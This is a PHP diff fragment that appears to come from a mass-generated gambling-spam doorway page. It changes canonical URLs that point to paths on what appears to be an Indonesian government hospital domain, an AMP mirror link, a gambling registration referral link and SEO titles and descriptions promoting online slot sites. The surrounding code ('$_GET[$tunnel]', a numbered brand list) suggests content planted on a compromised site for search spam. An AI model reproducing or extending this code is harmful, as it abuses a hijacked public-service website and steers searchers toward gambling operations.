@@ -59,17 +59,17 @@ if (isset($_GET[$tunnel])) {
 }
 $brand = strtolower($BRAND);
 $baseAuthor = $BRAND;
-$URL  = "https://ppid.rsud.grobogan.go.id/img/?or_id=$BRAND";
-$PAGEURL = "https://ppid.rsud.grobogan.go.id/img/?or_id=$BRAND";
-$AMP = "https://grobogan.pages.dev/?gacor=$BRAND";
+$URL  = "https://rsud.grobogan.go.id/img/?or_id=$BRAND";
+$PAGEURL = "https://rsud.grobogan.go.id/img/?or_id=$BRAND";
+$AMP = "https://mainkan-terus.pages.dev/?gacor=$BRAND";
 $DAFTAR = "https://gaga.betkeren.info/_View/Register.aspx?ref=B41EAA";
 $BANNER = "https://res.cloudinary.com/duoudu6za/image/upload/v1742638216/3645b6701dfd29d2b2a21aa22ee269c3_a0t0dz.jpg";
 $keyword = "$brand, LOGIN $brand, DAFTAR $brand, SITUS $brand, RTP $brand, LINK $brand, ALTERNATIF $brand, SLOT $brand, PARLAY $brand";
 
 if ($NUMLIST >= 1 && $NUMLIST <= 21134) {
-    $TITLE = "$BRAND - Link Login Daftar Situs Slot Gacor Uang Asli Gampang Menang 2025";
-    $DESCRIPTION = "Selamat datang di situs $BRAND, rekomendasi situs resmi slot gacor gampang menang dan maxwin setiap hari di tahun 2025";
-    $description = "Selamat datang di situs $BRAND, rekomendasi situs resmi slot gacor gampang menang dan maxwin setiap hari di tahun 2025";
+    $TITLE = "$BRAND - Link Alternatif Situs Slot MPO Depo 5k Resmi dan Gampang Menang Setiap Hari";
+    $DESCRIPTION = "Selamat datang di situs $BRAND, rekomendasi situs resmi slot mpo depo 5k gampang menang dan maxwin setiap hari di tahun 2025";
+    $description = "Selamat datang di situs $BRAND, rekomendasi situs resmi slot mpo depo 5k gampang menang dan maxwin setiap hari di tahun 2025";
 }
 
 ?>
